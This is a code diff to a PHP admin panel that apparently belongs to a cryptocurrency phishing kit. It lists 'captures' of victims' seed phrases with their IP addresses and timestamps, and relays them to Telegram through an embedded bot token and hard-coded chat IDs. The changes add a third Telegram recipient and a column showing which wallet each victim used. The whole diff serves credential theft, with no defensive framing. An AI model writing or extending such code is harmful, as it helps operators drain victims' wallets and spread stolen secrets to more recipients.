@@ -7,7 +7,8 @@ $ENCRYPTION_IV      = '1234567890abcdef';
 $TELEGRAM_BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
 $TELEGRAM_CHAT_IDS  = [
     getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
-    '8955126022'
+    '8955126022',
+    '8895304810'
 ];
 
 $isAuthed = false; $error = '';
@@ -148,7 +149,7 @@ if ($isAuthed) {
         /* STATS */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
             gap: 12px; margin-bottom: 24px;
         }
         .stat-card {
@@ -167,7 +168,7 @@ if ($isAuthed) {
             border-radius: 12px; overflow: hidden;
         }
         .table-scroll { overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; min-width: 700px; }
+        table { width: 100%; border-collapse: collapse; min-width: 820px; }
         th {
             padding: 12px 14px; text-align: left; font-size: 10px;
             color: #556677; text-transform: uppercase; letter-spacing: 0.5px;
@@ -180,6 +181,15 @@ if ($isAuthed) {
         }
         tr:last-child td { border-bottom: none; }
         tr:hover td { background: rgba(0,122,255,0.02); }
+        .wallet-badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            background: rgba(0,122,255,0.08);
+            color: #4da6ff;
+        }
         .cell-id { font-family: monospace; font-size: 10px; color: #445566; }
         .cell-ip { font-family: monospace; font-size: 11px; color: #667788; }
         .cell-seed { font-family: monospace; font-size: 11px; color: #4caf50; word-break: break-all; max-width: 240px; }
@@ -277,7 +287,7 @@ if ($isAuthed) {
         <?php
         if ($message === 'success_clear') echo '<div class="msg-bar"><div class="msg success">✓ All captures deleted</div></div>';
         if ($message === 'success_delete') echo '<div class="msg-bar"><div class="msg success">✓ Entry deleted</div></div>';
-        if ($message === 'success_tg') echo '<div class="msg-bar"><div class="msg success">✓ Telegram test sent to both recipients</div></div>';
+        if ($message === 'success_tg') echo '<div class="msg-bar"><div class="msg success">✓ Telegram test sent to 3 recipients</div></div>';
         if ($message === 'fail_tg') echo '<div class="msg-bar"><div class="msg error">✗ Telegram test failed — check token or chat IDs</div></div>';
 
         $logFile = __DIR__ . '/logs/captures.log';
@@ -315,6 +325,7 @@ if ($isAuthed) {
                         <thead>
                             <tr>
                                 <th>#</th>
+                                <th>Wallet</th>
                                 <th>ID</th>
                                 <th>Timestamp</th>
                                 <th>IP</th>
@@ -330,6 +341,7 @@ if ($isAuthed) {
                         <?php foreach (array_reverse($captures) as $idx => $c): $realIdx = count($captures) - 1 - $idx; ?>
                             <tr>
                                 <td><?php echo $idx + 1; ?></td>
+                                <td><span class="wallet-badge"><?php echo htmlspecialchars(ucfirst($c['wallet']??'?')); ?></span></td>
                                 <td class="cell-id"><?php echo htmlspecialchars(substr($c['id']??'', 0, 10)); ?></td>
                                 <td class="cell-time"><?php echo htmlspecialchars($c['capturedAt']??'—'); ?></td>
                                 <td class="cell-ip"><?php echo htmlspecialchars($c['ip']??'—'); ?></td>
